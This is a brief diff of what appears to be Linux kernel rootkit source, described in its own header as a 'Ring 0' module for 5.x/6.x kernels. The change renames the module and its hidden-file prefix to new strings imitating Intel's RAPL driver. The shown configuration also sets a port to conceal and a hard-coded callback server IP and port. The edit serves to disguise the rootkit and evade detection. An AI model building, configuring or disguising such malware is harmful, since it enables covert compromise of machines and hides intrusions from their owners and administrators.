@@ -28,9 +28,9 @@ MODULE_AUTHOR("br0sck");
 MODULE_DESCRIPTION("Ring 0  for Linux Kernels x86/x86_64 5.x/6.x");
 
 //=====================[YOU CAN CHANGE THIS]========================//
-#define MODULENAME "intel_rapl_snaps"      // if you change the file name, you must change it here too
+#define MODULENAME "intel_rapl_headers"      // if you change the file name, you must change it here too
 #define HIDE_PORT 1234              // 
-#define MAGIC_PREFIX "intelsnaps_"         // folder/file prefix to hide
+#define MAGIC_PREFIX "intelheaders_"         // folder/file prefix to hide
 //==========[AGENT EXECUTION]=========//
 #define YOUR_SRV_IP "77.110.126.70"     // (kept for compatibility, not used in agent mode)
 #define YOUR_SRV_PORT 1234          // (kept for compatibility, not used in agent mode)
